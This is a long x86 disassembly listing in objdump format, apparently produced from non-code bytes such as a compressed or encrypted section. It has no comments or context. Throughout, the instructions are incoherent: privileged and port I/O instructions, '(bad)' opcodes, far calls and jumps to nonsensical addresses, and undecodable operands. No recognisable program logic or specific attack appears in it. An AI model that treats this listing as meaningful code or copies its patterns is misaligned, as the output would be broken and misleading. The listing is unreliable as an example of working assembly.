  404fb9:	dec    ecx
  404fba:	test   BYTE PTR [edx+0x45],0x9f
  404fbe:	sub    dh,BYTE PTR ds:0x2e8efa99
  404fc4:	mov    ecx,0x82be8f77
  404fc9:	mov    eax,0x24735d7a
  404fce:	repz cmp al,0x20
  404fd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fd3:	add    ebx,DWORD PTR [edi+0x4f]
  404fd6:	iret   
  404fd7:	mov    ecx,0x591dfa8
  404fdc:	mov    cl,0x68
  404fde:	xchg   BYTE PTR [eax],dl
  404fe0:	mov    ?,WORD PTR [ebx]
  404fe2:	add    BYTE PTR [ecx],al
  404fe4:	icebp  
  404fe5:	dec    eax
  404fe6:	es int 0xd8
  404fe9:	mov    edx,0x676f1be2
  404fee:	push   esp
  404fef:	out    dx,eax
  404ff0:	and    dh,BYTE PTR [ebx]
  404ff2:	push   ebp
  404ff3:	(bad)  
  404ff4:	into   
  404ff5:	xor    eax,0x6a49145b
  404ffa:	ja     0x404fbd
  404ffc:	fldcw  WORD PTR [esi-0x39]
  404fff:	xchg   esi,eax
  405000:	(bad)  
  405001:	mov    ds:0x1036977e,al
  405006:	or     ecx,ebp
  405008:	inc    ecx
  405009:	clc    
  40500a:	jne    0x40501d
  40500c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40500d:	push   0x2f
  40500f:	add    eax,esi
  405011:	fldenv [edx+0x7c5cd992]
  405017:	lods   eax,DWORD PTR ds:[esi]
  405018:	addr16 dec ebp
  40501a:	mov    eax,0x2b928b1f
  40501f:	pop    eax
  405020:	jae    0x405013
  405022:	sbb    BYTE PTR [ebp-0x2347db3b],cl
  405028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405029:	adc    ah,BYTE PTR [ebx+eiz*2+0x57a82e54]
  405030:	xor    edi,esp
  405032:	push   eax
  405033:	jmp    0x8c1e34ac
  405038:	sub    eax,DWORD PTR [esi+ebx*8]
  40503b:	mov    ah,BYTE PTR [ebp-0x6b416b14]
  405041:	cmovl  esi,DWORD PTR [ecx]
  405044:	sbb    al,0xa7
  405046:	adc    al,0x66
  405048:	fsubr  st,st(6)
  40504a:	mov    ebx,0xc89ce32f
  40504f:	push   edi
  405050:	cwde   
  405051:	aad    0x7f
  405053:	push   es
  405054:	sub    esi,DWORD PTR [esi-0x72]
  405057:	fcmovnb st,st(3)
  405059:	jmp    0x4050bd
  40505b:	inc    ebp
  40505c:	loope  0x40505b
  40505e:	lods   eax,DWORD PTR ds:[esi]
  40505f:	xlat   BYTE PTR ds:[ebx]
  405060:	push   ebx
  405061:	test   BYTE PTR [edi],ah
  405063:	fsubr  DWORD PTR [edx-0xf]
  405066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405067:	sti    
  405068:	in     eax,dx
  405069:	fs mov edx,0xe08e096c
  40506f:	popa   
  405070:	and    eax,0xb36c488a
  405075:	hlt    
  405076:	das    
  405077:	push   edi
  405078:	and    ebx,DWORD PTR [esi+0x3b]
  40507b:	test   cl,ah
  40507d:	sbb    cl,BYTE PTR es:[ebp-0x24]
  405081:	sar    ecx,cl
  405083:	cmp    eax,0xde26a516
  405088:	xchg   edx,eax
  405089:	and    BYTE PTR [ecx],0x96
  40508c:	into   
  40508d:	sahf   
  40508e:	xchg   ebp,eax
  40508f:	push   esp
  405090:	inc    BYTE PTR [eax+esi*1+0x5c]
  405094:	xchg   esi,eax
  405095:	push   es
  405096:	in     eax,0xb0
  405098:	xchg   ecx,eax
  405099:	sub    eax,0x5a7d1ada
  40509e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40509f:	ds gs inc ecx
  4050a2:	xor    al,0xad
  4050a4:	ds call 0x667f:0xb8697e5c
  4050ac:	jns    0x405099
  4050ae:	pop    ebx
  4050af:	jnp    0x40503d
  4050b1:	sub    cl,0xee
  4050b4:	bound  ecx,QWORD PTR ds:0x4f2be020
  4050ba:	sub    al,0xb4
  4050bc:	pop    edx
  4050bd:	bound  edx,QWORD PTR [ebp-0x5e]
  4050c0:	call   0xe246:0x71affb04
  4050c7:	or     BYTE PTR [ebx-0x56],0xb3
  4050cb:	(bad)
  4050ce:	cmp    DWORD PTR [ecx],ecx
  4050d0:	inc    edx
  4050d1:	ja     0x4050e3
  4050d3:	shrd   DWORD PTR [edx+edx*2-0x5d1e113e],ebx,0xc4
  4050dc:	gs xor al,cl
  4050df:	jnp    0x405091
  4050e1:	xchg   edx,eax
  4050e2:	adc    esp,DWORD PTR [eax+ebx*8]
  4050e5:	in     eax,dx
  4050e6:	fadd   QWORD PTR [ecx]
  4050e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050e9:	jmp    0xbb17eb85
  4050ee:	adc    al,BYTE PTR [eax-0x60067582]
  4050f4:	mov    fs,WORD PTR [ebx-0x7e]
  4050f7:	xchg   edi,eax
  4050f8:	ja     0x40507d
  4050fa:	mov    ds:0xca21154b,al
  4050ff:	mov    cl,ah
  405101:	adc    eax,0x898721ea
  405106:	cwde   
  405107:	pop    ss
  405108:	cmp    BYTE PTR [edi],dh
  40510a:	stos   BYTE PTR es:[edi],al
  40510b:	sbb    bh,bh
  40510d:	cld    
  40510e:	dec    ebp
  40510f:	outs   dx,BYTE PTR ds:[esi]
  405110:	dec    esi
  405111:	div    BYTE PTR [esi]
  405113:	test   eax,0x9b674ee9
  405118:	pop    edx
  405119:	cmp    eax,0x75698e92
  40511e:	mov    ah,0xad
  405120:	in     al,dx
  405121:	cli    
  405122:	inc    ebx
  405123:	xor    al,0x28
  405125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405126:	pop    edi
  405127:	repz loop 0x405108
  40512a:	xor    esp,eax
  40512c:	push   ds
  40512d:	sub    BYTE PTR [edx-0x401df3d],bh
  405133:	mov    DWORD PTR ds:0x404,ebp
  405138:	(bad)  
  405139:	or     ebp,DWORD PTR [ecx+0x3e]
  40513c:	xchg   esp,eax
  40513d:	mov    ecx,0x2be855cf
  405142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405143:	jnp    0x405135
  405145:	hlt    
  405146:	adc    BYTE PTR [ebp+0x2959ee71],cl
  40514c:	inc    ebp
  40514d:	es sub al,0x57
  405150:	div    DWORD PTR [esi+0x4b]
  405153:	mov    ebp,0xe4117863
  405158:	adc    BYTE PTR [ebp-0x2ce6a096],dh
  40515e:	fst    st(5)
  405160:	sub    BYTE PTR [ecx-0x54],bh
  405163:	outs   dx,BYTE PTR ds:[esi]
  405164:	dec    esi
  405165:	cmp    al,0x9a
  405167:	outs   dx,BYTE PTR ds:[esi]
  405168:	int3   
  405169:	jnp    0x4050f4
  40516b:	hlt    
  40516c:	or     al,0xb0
  40516e:	daa    
  40516f:	imul   eax,DWORD PTR [ebx-0x18],0xffffffd8
  405173:	dec    ebx
  405174:	xchg   ebp,eax
  405175:	out    0xe8,al
  405177:	addr16 aaa 
  405179:	sub    DWORD PTR [eax-0x4c],ecx
  40517c:	pop    ecx
  40517d:	or     al,0x5b
  40517f:	fs fwait
  405181:	xchg   ecx,eax
  405182:	fild   QWORD PTR [ebx]
  405184:	(bad)  
  405185:	aad    0xfb
  405187:	jle    0x4051ad
  405189:	cmp    edi,DWORD PTR [eax+eiz*2-0x5383151c]
  405190:	pop    esi
  405191:	jb     0x405167
  405193:	pushf  
  405194:	(bad)  
  405196:	fdiv   QWORD PTR [esi+0x4f]
  405199:	shr    BYTE PTR [ebp+ebx*1+0x58406af],cl
  4051a0:	or     ah,BYTE PTR [edx+0x65cd0ba2]
  4051a6:	retf   
  4051a7:	stos   BYTE PTR es:[edi],al
  4051a8:	and    esi,DWORD PTR [edi-0x7b4d7bc2]
  4051ae:	retf   
  4051af:	pop    esi
  4051b0:	add    BYTE PTR [ebp+0x18b47042],0xf5
  4051b7:	sti    
  4051b8:	inc    ecx
  4051b9:	arpl   WORD PTR [esi-0xec89f6e],bx
  4051bf:	adc    eax,0xc2533ded
  4051c4:	push   es
  4051c5:	rcr    ecx,cl
  4051c7:	sub    eax,0x83f3b0d7
  4051cc:	mov    ebx,0x4c717dff
  4051d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051d2:	nop
  4051d3:	adc    BYTE PTR [ecx+0x78],al
  4051d6:	cmp    DWORD PTR [ebx-0x67],ebp
  4051d9:	sub    ebp,esp
  4051db:	jbe    0x4051d6
  4051dd:	sar    DWORD PTR [eax+0x6a248e6],cl
  4051e3:	mov    BYTE PTR [esi-0x53a63f4a],0xf7
  4051ea:	lods   eax,DWORD PTR ds:[esi]
  4051eb:	pop    esp
  4051ec:	fdivr  DWORD PTR [edi]
  4051ee:	test   eax,0x6cb5c277
  4051f3:	push   edx
  4051f4:	js     0x4051ac
  4051f6:	push   ecx
  4051f7:	inc    edx
  4051f8:	dec    edi
  4051f9:	(bad)  
  4051fa:	push   esi
  4051fb:	popf   
  4051fc:	xor    DWORD PTR [ebp+0x39220a97],0xdb71b7ab
  405206:	test   BYTE PTR [esi],bh
  405208:	adc    BYTE PTR [esi-0x385aa8c8],ch
  40520e:	mov    WORD PTR [edi+0x53f6b1],gs
  405214:	fimul  DWORD PTR [edi]
  405216:	leave  
  405217:	(bad)  
  405218:	xlat   BYTE PTR ds:[ebx]
  405219:	adc    DWORD PTR [ecx-0xb],ebp
  40521c:	in     eax,dx
  40521d:	daa    
  40521e:	pop    es
  40521f:	popa   
  405220:	stc    
  405221:	mov    ah,0xcc
  405223:	test   bl,bl
  405225:	push   es
  405226:	pop    es
  405227:	pop    eax
  405228:	sbb    DWORD PTR [esi+0x7cc805e4],ebp
  40522e:	xor    eax,0x1722ca82
  405233:	lea    eax,[ebx+eiz*4]
  405236:	sub    DWORD PTR [edx+0x72],ebx
  405239:	sub    ebx,edi
  40523b:	shl    ch,cl
  40523d:	push   0x28f76456
  405242:	dec    edx
  405243:	sbb    ebx,ecx
  405245:	jg     0x4051df
  405247:	inc    ecx
  405248:	lock imul eax,DWORD PTR ds:0x3ad3a03a,0x40b3b14a
  405253:	jmp    0xa4d02e18
  405258:	cdq    
  405259:	inc    edx
  40525a:	out    dx,eax
  40525b:	lock or al,0x1a
  40525e:	mov    bh,BYTE PTR [ebp+0x2]
  405261:	xchg   edx,eax
  405262:	push   es
  405263:	push   esp
  405264:	mov    edx,0x53b9fb17
  405269:	adc    BYTE PTR [ecx+0x21],bl
  40526c:	les    ebp,FWORD PTR [eax]
  40526e:	push   ebx
  40526f:	sub    esi,ecx
  405271:	dec    edx
  405272:	mov    BYTE PTR [edi-0x4d],bl
  405275:	test   eax,0xb0f5b2f8
  40527a:	xchg   ecx,eax
  40527b:	test   al,0x4
  40527d:	and    eax,0xa698bc4
  405282:	int    0x7b
  405284:	push   0xffffffbe
  405286:	push   esi
  405287:	push   0xfad69847
  40528c:	push   es
  40528d:	cmp    DWORD PTR [ebp+0x40d0993a],ecx
  405293:	jmp    0x405251
  405295:	iret   
  405296:	sahf   
  405297:	int3   
  405298:	hlt    
  405299:	xchg   edx,eax
  40529a:	jo     0x405237
  40529c:	pop    ebx
  40529d:	pop    esi
  40529e:	push   edi
  40529f:	(bad)
  4052a2:	push   edx
  4052a3:	adc    ebp,0xffffffc1
  4052a6:	push   ebp
  4052a7:	pop    ebp
  4052a8:	retf   
  4052a9:	dec    esi
  4052aa:	mov    eax,ds:0x20ef3a0b
  4052af:	in     al,0x46
  4052b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052b2:	pop    edi
  4052b3:	jg     0x4052dc
  4052b5:	adc    BYTE PTR [edi],0xc5
  4052b8:	dec    ebx
  4052b9:	cmp    bl,0x9f
  4052bc:	pop    ebp
  4052bd:	into   
  4052be:	mov    ecx,edx
  4052c0:	call   FWORD PTR [ebp-0x1c]
  4052c3:	mov    al,ds:0xacb46e62
  4052c8:	dec    eax
  4052c9:	fstp   QWORD PTR [eiz*4+0x3490bfe1]
  4052d0:	jbe    0x4052f7
  4052d2:	inc    esi
  4052d3:	pop    edx
  4052d4:	add    ebx,edx
  4052d6:	adc    ah,BYTE PTR [ebp+0x6c]
  4052d9:	out    0x21,eax
  4052db:	mov    ah,0xe0
  4052dd:	(bad)  
  4052de:	retf   0x4300
  4052e1:	mov    esi,0x7551fcb2
  4052e6:	inc    edx
  4052e7:	sahf   
  4052e8:	dec    eax
  4052e9:	push   ebp
  4052ea:	inc    ecx
  4052eb:	mov    dl,0xe0
  4052ed:	sub    al,0x21
  4052ef:	sbb    BYTE PTR [edx],0xcf
  4052f2:	(bad)  
  4052f3:	je     0x40529c
  4052f5:	popa   
  4052f6:	inc    esi
  4052f7:	int3   
  4052f8:	ret    0x6abf
  4052fb:	and    eax,0x2968d810
  405300:	push   ecx
  405301:	aam    0x62
  405303:	js     0x40528b
  405305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405306:	sub    ecx,DWORD PTR [edx+0x1f]
  405309:	jb     0x4052b6
  40530b:	add    edx,DWORD PTR [edi]
  40530d:	jb     0x4052dd
  40530f:	sti    
  405310:	adc    BYTE PTR [ebx+0x5c],dl
  405313:	mov    esp,0x19979339
  405318:	xchg   BYTE PTR [ebx],bh
  40531a:	pop    esp
  40531b:	xor    ebp,DWORD PTR [edx-0x3a]
  40531e:	xchg   esi,eax
  40531f:	stos   BYTE PTR es:[edi],al
  405320:	popf   
  405321:	jmp    DWORD PTR [ebx+0x365548ba]
  405327:	(bad)  
  405328:	pop    esp
  405329:	lods   al,BYTE PTR ds:[esi]
  40532a:	faddp  st(3),st
  40532c:	xor    al,0xc3
  40532e:	mov    al,0x88
  405330:	fwait
  405331:	pop    esi
  405332:	out    dx,eax
  405333:	lahf   
  405334:	enter  0xbd2d,0xfb
  405338:	jmp    0x40536a
  40533a:	retf   0x419a
  40533d:	mov    ds:0x46676c4,al
  405342:	outs   dx,BYTE PTR ds:[esi]
  405343:	ss enter 0x3774,0x64
  405348:	es ret 
  40534a:	mov    ds:0xcd2b8178,eax
  40534f:	inc    esi
  405350:	ficomp DWORD PTR [edi*2+0x4117aca7]
  405357:	loopne 0x40535c
  405359:	les    edx,FWORD PTR [ebp+0x71]
  40535c:	sbb    DWORD PTR [esi-0x64b2e740],0x3b
  405363:	xor    al,0x1f
  405365:	xlat   BYTE PTR ds:[ebx]
  405366:	sbb    DWORD PTR [edi+0x49],0xa2bbc880
  40536d:	div    DWORD PTR [ecx]
  40536f:	mov    esp,0xbe12220e
  405374:	mov    bl,0xd4
  405376:	mov    dh,0xec
  405378:	xor    al,0x20
  40537a:	icebp  
  40537b:	inc    edi
  40537c:	rol    BYTE PTR [esi-0x9],0x7d
  405380:	pushf  
  405381:	dec    ecx
  405382:	in     al,0xfe
  405384:	mov    edi,0x68d57bb9
  405389:	out    0x7a,eax
  40538b:	call   0x924f:0x5c377439
  405392:	inc    ecx
  405393:	mov    ss,WORD PTR [eax]
  405395:	and    al,0x47
  405397:	inc    ebp
  405398:	fdivr  DWORD PTR [ecx+0x76]
  40539b:	cmc    
  40539c:	push   0xe4d71e90
  4053a1:	cmc    
  4053a2:	aaa    
  4053a3:	repnz mov al,0x7e
  4053a6:	pop    esp
  4053a7:	pop    edi
  4053a8:	or     edx,DWORD PTR [eax]
  4053aa:	dec    esi
  4053ab:	xor    al,0xf6
  4053ad:	jo     0x4053e3
  4053af:	mov    eax,ds:0xda24dce4
  4053b4:	sti    
  4053b5:	add    DWORD PTR [edi],edx
  4053b7:	sbb    DWORD PTR [ecx+eax*1-0x6b67339e],eax
  4053be:	dec    BYTE PTR [edi-0xa]
  4053c1:	mov    bh,0x42
  4053c3:	inc    esi
  4053c4:	sub    DWORD PTR [eax+ecx*4+0x3be8417],eax
  4053cb:	je     0x40544a
  4053cd:	out    dx,eax
  4053ce:	cli    
  4053cf:	xchg   DWORD PTR [ebp+0x3e],edi
  4053d2:	sbb    DWORD PTR [ecx*4+0x50611f01],edi
  4053d9:	add    eax,0x57fb3009
  4053de:	lock dec eax
  4053e0:	cmp    eax,0xafb3efc
  4053e5:	fcomp  DWORD PTR [eax-0x16d5ef77]
  4053eb:	hlt    
  4053ec:	mov    cl,BYTE PTR [edx]
  4053ee:	call   0x3df1:0xe1ae0901
  4053f5:	mov    esp,0x6c93fee6
  4053fa:	test   BYTE PTR [ecx],dl
  4053fc:	add    esp,DWORD PTR [edi+0x35]
  4053ff:	nop
  405400:	out    dx,eax
  405401:	loop   0x405478
  405403:	fcomp  QWORD PTR [eax+0x424d1da1]
  405409:	pushf  
  40540a:	jae    0x405474
  40540c:	(bad)  
  40540d:	sub    al,0x99
  40540f:	je     0x4053fa
  405411:	cmp    DWORD PTR [edx-0x1946560c],ecx
  405417:	mov    DWORD PTR [eax],esp
  405419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40541a:	fnstenv [edi+0x6b]
  40541d:	retf   
  40541e:	jns    0x40542c
  405420:	lock mov al,ds:0x2adf30f1
  405426:	js     0x4053af
  405428:	pop    ss
  405429:	shl    DWORD PTR [edx+0x5e],0xb4
  40542d:	jecxz  0x4053c1
  40542f:	inc    ecx
  405430:	imul   esi,esi,0x77
  405433:	jl     0x4053d8
  405435:	dec    eax
  405436:	mov    esi,0x3dfa2570
  40543b:	adc    BYTE PTR [eax],cl
  40543d:	adc    DWORD PTR [edx+edi*1+0x13],esi
  405441:	push   eax
  405442:	push   0x6505ef8c
  405447:	mov    WORD PTR [edi-0x4d],gs
  40544a:	inc    esi
  40544b:	not    edx
  40544d:	div    BYTE PTR [edi+0x673e1b29]
  405453:	xchg   edx,eax
  405454:	sbb    dl,ch
  405456:	test   ebx,edi
  405458:	(bad)  
  405459:	sub    ecx,DWORD PTR [ebx]
  40545b:	xchg   DWORD PTR [ebp-0x1a64b211],ecx
  405461:	lahf   
  405462:	mov    cl,0x71
  405464:	int    0x76
  405466:	mov    dh,0x56
  405468:	pop    ebx
  405469:	inc    edi
  40546a:	clc    
  40546b:	jmp    0x715b311e
  405470:	mov    ?,WORD PTR [ebx]
  405472:	mov    bl,0x18
  405474:	xchg   edi,eax
  405475:	ficom  DWORD PTR [esp+ebp*1]
  405478:	pop    eax
  405479:	aaa    
  40547a:	or     eax,0x1d7e31b1
  40547f:	and    eax,DWORD PTR gs:[eax]
  405482:	int3   
  405483:	dec    ecx
  405484:	jmp    0x405464
  405486:	pop    ss
  405487:	push   ss
  405488:	sub    eax,0x54a518b0
  40548d:	adc    BYTE PTR [edx+0x77],0xda
  405491:	xor    DWORD PTR [esi+0x70],edx
  405494:	sub    al,0x38
  405496:	push   ds
  405497:	shl    DWORD PTR [ebp+0x653c1916],1
  40549d:	outs   dx,DWORD PTR cs:[esi]
  40549f:	(bad)  
  4054a0:	sub    al,0x9b
  4054a2:	mov    eax,0xd5724c08
  4054a7:	pop    esi
  4054a8:	jo     0x4054b0
  4054aa:	fnstenv [edx]
  4054ac:	mov    dl,0x29
  4054ae:	mov    ecx,0xa4cf5468
  4054b3:	shl    DWORD PTR [ebp+esi*8+0x78],1
  4054b7:	std    
  4054b8:	arpl   WORD PTR [esi],dx
  4054ba:	rcr    BYTE PTR [edi-0x28],1
  4054bd:	push   ds
  4054be:	inc    eax
  4054bf:	jb     0x405490
  4054c1:	cmp    ch,dl
  4054c3:	sub    cl,bl
  4054c5:	pusha  
  4054c6:	test   eax,0xf1ac2c74
  4054cb:	add    bh,BYTE PTR [edx-0x2dc3fe12]
  4054d1:	inc    esp
  4054d2:	push   edi
  4054d3:	mov    cl,0x6e
  4054d5:	xor    al,0xf5
  4054d7:	lds    ecx,FWORD PTR [ecx+eax*4-0x4645b1a1]
  4054de:	jecxz  0x40549a
  4054e0:	jmp    0x40551a
  4054e2:	push   ecx
  4054e3:	mov    dl,0xa7
  4054e5:	or     eax,0x500cd9f4
  4054ea:	outs   dx,DWORD PTR ds:[esi]
  4054eb:	sub    DWORD PTR [ecx],0x8450ee56
  4054f1:	icebp  
  4054f2:	scas   al,BYTE PTR es:[edi]
  4054f3:	push   ebp
  4054f4:	sub    al,0x4c
  4054f6:	sar    BYTE PTR [ebx+0x2912f7c3],cl
  4054fc:	sahf   
  4054fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054fe:	jmp    0x555dbc7a
  405503:	or     ah,dh
  405505:	rcl    BYTE PTR [esi+0x2415b2f9],0x5c
  40550c:	or     BYTE PTR [ecx+eiz*4-0x36],dl
  405510:	jae    0x4054d6
  405512:	mov    cl,0x67
  405514:	dec    ebp
  405515:	cmc    
  405516:	jae    0x405552
  405518:	sbb    ebp,DWORD PTR [eax+edx*1]
  40551b:	call   0x9a30eb08
  405520:	clc    
  405521:	xchg   ebx,eax
  405522:	push   ds
  405523:	inc    edi
  405524:	add    DWORD PTR [eax],edi
  405526:	mov    bh,ch
  405528:	pop    eax
  405529:	push   edx
  40552a:	mov    esi,0x13f115fd
  40552f:	in     eax,dx
  405530:	in     al,dx
  405531:	arpl   bx,bx
  405533:	loope  0x40551f
  405535:	mov    ebx,DWORD PTR gs:[esi]
  405538:	inc    esp
  405539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40553a:	xor    ebp,DWORD PTR ds:0x41df8bd6
  405540:	mov    esp,0xfc3e4a6a
  405545:	and    BYTE PTR [eax-0x49],al
  405548:	scas   eax,DWORD PTR es:[edi]
  405549:	jno    0x405507
  40554b:	repnz xchg ch,ch
  40554e:	sub    bh,ch
  405550:	jle    0x4054d5
  405552:	jmp    0x21f27d0
  405557:	(bad)  
  405558:	and    ah,BYTE PTR [ecx-0x51]
  40555b:	mov    dl,0xf0
  40555d:	mov    al,0xb
  40555f:	(bad)  
  405560:	cs inc ebx
  405562:	call   FWORD PTR [ecx]
  405564:	stos   DWORD PTR es:[edi],eax
  405565:	test   eax,0x599dc448
  40556a:	mov    eax,0x862a6caa
  40556f:	mov    edi,0xd1aa56c3
  405574:	bound  ebx,QWORD PTR [eax-0x51]
  405577:	sub    eax,0xa345f777
  40557c:	in     eax,dx
  40557d:	jae    0x4055ba
  40557f:	lds    edi,FWORD PTR [edx+0x0]
  405582:	fistp  QWORD PTR [ecx+0x3e]
  405585:	(bad)  
  405586:	out    0x34,al
  405588:	mov    eax,ds:0xae035bd6
  40558d:	push   edx
  40558e:	jns    0x4055d9
  405590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405591:	jns    0x4055d7
  405593:	lds    ebp,FWORD PTR [ecx-0x23]
  405596:	mov    al,0x11
  405598:	mov    eax,DWORD PTR [ecx-0x7f]
  40559b:	pop    ss
  40559c:	stc    
  40559d:	ins    DWORD PTR es:[edi],dx
  40559e:	mov    dl,cl
  4055a0:	xchg   ebx,eax
  4055a1:	jmp    0xe081ae3f
  4055a6:	pop    esp
  4055a7:	mov    ah,0xe
  4055a9:	jne    0x405610
  4055ab:	das    
  4055ac:	aaa    
  4055ad:	xor    DWORD PTR [ebx-0x2d],esi
  4055b0:	pop    ecx
  4055b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b2:	std    
  4055b3:	pop    edx
  4055b4:	push   ebp
  4055b5:	inc    ebx
  4055b6:	add    DWORD PTR [edi-0x77],eax
  4055b9:	daa    
  4055ba:	out    0x7c,al
  4055bc:	adc    edx,eax
  4055be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055bf:	mov    dl,ah
  4055c1:	add    ecx,DWORD PTR ds:0x57c313d
  4055c7:	add    DWORD PTR ds:0x1eb64601,ebp
  4055cd:	dec    ebp
  4055ce:	pop    esp
  4055cf:	or     al,0x6e
  4055d1:	jp     0x4055a4
  4055d3:	sub    BYTE PTR [edx],ch
  4055d5:	sbb    ch,BYTE PTR [ebx+edi*4+0x46]
  4055d9:	(bad)  
  4055db:	leave  
  4055dc:	sbb    DWORD PTR [eax],0x46
  4055df:	ins    DWORD PTR es:[edi],dx
  4055e0:	aas    
  4055e1:	aam    0x25
  4055e3:	push   edx
  4055e4:	cmp    DWORD PTR [ebp-0x2d],0x3d
  4055e8:	lea    edi,[ebx+0x670e2924]
  4055ee:	add    al,BYTE PTR [ecx+0x64]
  4055f1:	sbb    al,0x8a
  4055f3:	jecxz  0x4055b0
  4055f5:	mov    edx,0x70e3c98
  4055fa:	dec    esi
  4055fb:	scas   eax,DWORD PTR es:[edi]
  4055fc:	pop    edx
  4055fd:	stc    
  4055fe:	out    dx,al
  4055ff:	dec    eax
  405600:	xlat   BYTE PTR ds:[ebx]
  405601:	push   esi
  405602:	fild   DWORD PTR [ebx]
  405604:	test   BYTE PTR [eax],cl
  405606:	test   DWORD PTR [ecx+0xf],edx
  405609:	fild   DWORD PTR [eax-0x7b]
  40560c:	mov    dl,0x3b
  40560e:	popf   
  40560f:	inc    esi
  405610:	mov    al,ds:0x4c0aca15
  405615:	xchg   edi,eax
  405616:	pop    es
  405617:	dec    edi
  405618:	push   ecx
  405619:	mov    bl,0x5a
  40561b:	or     al,0x3e
  40561d:	in     eax,0x1e
  40561f:	mov    DWORD PTR [esi-0x1e],esi
  405622:	jno    0x40564a
  405624:	and    bh,cl
  405626:	std    
  405627:	aaa    
  405628:	out    0x82,al
  40562a:	mov    esp,0xd91f008d
  40562f:	popf   
  405630:	pop    esi
  405631:	mov    bh,0x9
  405633:	mov    ch,0xbe
  405635:	inc    edx
  405636:	sub    al,0x38
  405638:	cmp    edi,DWORD PTR [ebx+0x5ad7a240]
  40563e:	out    dx,al
  40563f:	push   ds
  405640:	mov    bh,0xb4
  405642:	sbb    al,0x9c
  405644:	fsub   QWORD PTR [ebx-0x76]
  405647:	mov    edx,0x9cdca37c
  40564c:	clc    
  40564d:	daa    
  40564e:	add    DWORD PTR [edx+0x56924857],esp
  405654:	stc    
  405655:	std    
  405656:	inc    ecx
  405657:	mov    ebx,0xf62881d5
  40565c:	mov    cs:0xea0ef894,eax
  405662:	push   cs
  405663:	dec    edi
  405664:	push   cs
  405665:	cmp    eax,0xebaba185
  40566a:	add    eax,DWORD PTR [esi+0x7abb0347]
  405670:	daa    
  405671:	arpl   di,dx
  405673:	cmp    eax,0x248038c9
  405678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405679:	mov    ecx,DWORD PTR [esi+0x5c]
  40567c:	adc    BYTE PTR [edi-0x41],cl
  40567f:	sub    ebp,DWORD PTR [eax+0xa]
  405682:	pusha  
  405683:	jle    0x4056ec
  405685:	mov    al,0x21
  405687:	out    dx,eax
  405688:	inc    ebx
  405689:	dec    ebx
  40568a:	jo     0x4056e3
  40568c:	xchg   ebx,eax
  40568d:	mov    ecx,0xf519ec03
  405692:	pop    esp
  405693:	scas   al,BYTE PTR es:[edi]
  405694:	ja     0x4056fb
  405696:	mov    ebx,0x1e28b930
  40569b:	cmp    BYTE PTR [edx+0x4ad84b7d],al
  4056a1:	stos   DWORD PTR es:[edi],eax
  4056a2:	xchg   ebx,eax
  4056a3:	les    ebx,FWORD PTR [esi+0x761bb207]
  4056a9:	out    0x4e,al
  4056ab:	(bad)  
  4056ac:	neg    dh
  4056ae:	xor    eax,0xd9a4fec5
  4056b3:	push   esp
  4056b4:	jmp    0x4056cc
  4056b6:	cmp    DWORD PTR [edx-0x6beac066],edx
  4056bc:	leave  
  4056bd:	sar    ch,cl
  4056bf:	dec    esp
  4056c0:	ret    0x9754
  4056c3:	shr    BYTE PTR [edi],1
  4056c5:	daa    
  4056c6:	xor    DWORD PTR [edx],ebp
  4056c8:	adc    al,0x29
  4056ca:	or     al,0x4e
  4056cc:	pushf  
  4056cd:	xchg   edx,eax
  4056ce:	pop    ebp
  4056cf:	pusha  
  4056d0:	ins    BYTE PTR es:[edi],dx
  4056d1:	mul    bl
  4056d3:	retf   0xf91a
  4056d6:	jnp    0x405751
  4056d8:	lahf   
  4056d9:	xchg   edx,ebx
  4056db:	imul   ebp,DWORD PTR [esi],0x9a2124b4
  4056e1:	hlt    
  4056e2:	jecxz  0x405679
  4056e4:	jb     0x405722
  4056e6:	sbb    eax,0x52c905c0
  4056eb:	jecxz  0x40573d
  4056ed:	outs   dx,BYTE PTR ds:[esi]
  4056ee:	pop    ebx
  4056ef:	dec    ebp
  4056f0:	or     DWORD PTR gs:[ecx],ebp
  4056f3:	add    ah,dl
  4056f5:	xchg   edi,eax
  4056f6:	in     eax,dx
  4056f7:	push   eax
  4056f8:	add    bh,BYTE PTR [esi-0x1b]
  4056fb:	ins    DWORD PTR es:[edi],dx
  4056fc:	cmp    eax,0x2b7e9416
  405701:	repnz push ss
  405703:	mov    esi,0xe5acc079
  405708:	cmc    
  405709:	mov    ebx,esi
  40570b:	cwde   
  40570c:	mov    ebp,0xd3f36fd
  405711:	and    ebp,DWORD PTR [ebx+0x1]
  405714:	mov    ebx,DWORD PTR [ecx-0x22]
  405717:	sub    esp,ecx
  405719:	pop    es
  40571a:	and    bh,BYTE PTR [esi]
  40571c:	clc    
  40571d:	idiv   DWORD PTR [esi+0x3]
  405720:	ret    
  405721:	lods   eax,DWORD PTR ds:[esi]
  405722:	sahf   
  405723:	adc    DWORD PTR [ebx],edx
  405725:	rcr    BYTE PTR [edi],cl
  405727:	xor    BYTE PTR [edx-0x9],ch
  40572a:	popf   
  40572b:	sbb    dl,bh
  40572d:	sub    al,0x4b
  40572f:	sub    DWORD PTR [edi-0x22dcc04e],edi
  405735:	xchg   ebx,eax
  405736:	jnp    0x4056e2
  405738:	push   0xffffffa4
  40573a:	xor    eax,esi
  40573c:	out    dx,al
  40573d:	push   edi
  40573e:	outs   dx,DWORD PTR ds:[esi]
  40573f:	mov    esi,0xa240190b
  405744:	mov    bh,0xdf
  405746:	inc    dh
  405748:	inc    ebp
  405749:	inc    ebp
